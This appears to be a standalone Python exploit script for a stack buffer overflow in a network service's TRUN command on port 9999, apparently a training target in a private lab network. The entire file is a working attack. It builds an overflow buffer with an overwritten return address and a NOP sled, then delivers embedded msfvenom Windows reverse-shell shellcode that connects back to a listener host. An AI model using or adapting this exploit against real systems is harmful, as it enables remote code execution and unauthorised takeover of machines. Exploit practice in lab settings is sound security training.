#!/usr/bin/python
import socket, sys
from struct import pack
import time

def main():
	server = "192.168.130.169"
	port = 9999

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	print(s.recv(1024))

	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.130.1 LPORT=4444 -f python -v shellcode -b '\x00' EXITFUNC=thread
	shellcode =  b""
	shellcode += b"\xdb\xd9\xba\xe2\x7a\x35\xd9\xd9\x74\x24\xf4"
	shellcode += b"\x5b\x2b\xc9\xb1\x52\x31\x53\x17\x03\x53\x17"
	shellcode += b"\x83\x21\x7e\xd7\x2c\x59\x97\x95\xcf\xa1\x68"
	shellcode += b"\xfa\x46\x44\x59\x3a\x3c\x0d\xca\x8a\x36\x43"
	shellcode += b"\xe7\x61\x1a\x77\x7c\x07\xb3\x78\x35\xa2\xe5"
	shellcode += b"\xb7\xc6\x9f\xd6\xd6\x44\xe2\x0a\x38\x74\x2d"
	shellcode += b"\x5f\x39\xb1\x50\x92\x6b\x6a\x1e\x01\x9b\x1f"
	shellcode += b"\x6a\x9a\x10\x53\x7a\x9a\xc5\x24\x7d\x8b\x58"
	shellcode += b"\x3e\x24\x0b\x5b\x93\x5c\x02\x43\xf0\x59\xdc"
	shellcode += b"\xf8\xc2\x16\xdf\x28\x1b\xd6\x4c\x15\x93\x25"
	shellcode += b"\x8c\x52\x14\xd6\xfb\xaa\x66\x6b\xfc\x69\x14"
	shellcode += b"\xb7\x89\x69\xbe\x3c\x29\x55\x3e\x90\xac\x1e"
	shellcode += b"\x4c\x5d\xba\x78\x51\x60\x6f\xf3\x6d\xe9\x8e"
	shellcode += b"\xd3\xe7\xa9\xb4\xf7\xac\x6a\xd4\xae\x08\xdc"
	shellcode += b"\xe9\xb0\xf2\x81\x4f\xbb\x1f\xd5\xfd\xe6\x77"
	shellcode += b"\x1a\xcc\x18\x88\x34\x47\x6b\xba\x9b\xf3\xe3"
	shellcode += b"\xf6\x54\xda\xf4\xf9\x4e\x9a\x6a\x04\x71\xdb"
	shellcode += b"\xa3\xc3\x25\x8b\xdb\xe2\x45\x40\x1b\x0a\x90"
	shellcode += b"\xc7\x4b\xa4\x4b\xa8\x3b\x04\x3c\x40\x51\x8b"
	shellcode += b"\x63\x70\x5a\x41\x0c\x1b\xa1\x02\xf3\x74\x2b"
	shellcode += b"\xd3\x9b\x86\x2b\xc5\x07\x0e\xcd\x8f\xa7\x46"
	shellcode += b"\x46\x38\x51\xc3\x1c\xd9\x9e\xd9\x59\xd9\x15"
	shellcode += b"\xee\x9e\x94\xdd\x9b\x8c\x41\x2e\xd6\xee\xc4"
	shellcode += b"\x31\xcc\x86\x8b\xa0\x8b\x56\xc5\xd8\x03\x01"
	shellcode += b"\x82\x2f\x5a\xc7\x3e\x09\xf4\xf5\xc2\xcf\x3f"
	shellcode += b"\xbd\x18\x2c\xc1\x3c\xec\x08\xe5\x2e\x28\x90"
	shellcode += b"\xa1\x1a\xe4\xc7\x7f\xf4\x42\xbe\x31\xae\x1c"
	shellcode += b"\x6d\x98\x26\xd8\x5d\x1b\x30\xe5\x8b\xed\xdc"
	shellcode += b"\x54\x62\xa8\xe3\x59\xe2\x3c\x9c\x87\x92\xc3"
	shellcode += b"\x77\x0c\xb2\x21\x5d\x79\x5b\xfc\x34\xc0\x06"
	shellcode += b"\xff\xe3\x07\x3f\x7c\x01\xf8\xc4\x9c\x60\xfd"
	shellcode += b"\x81\x1a\x99\x8f\x9a\xce\x9d\x3c\x9a\xda"

	eip = pack("<L", (0x625011af))

	buf = b"TRUN ."
	buf += b"A"*2006
	buf += eip
	buf += b"\x90" * 30
	buf += shellcode
	buf += b"C"*(0xBB8 -len(buf))

	s.send(buf)

	print(s.recv(1024))

	s.close()
	sys.exit(0)

if __name__ == "__main__":
 	main()
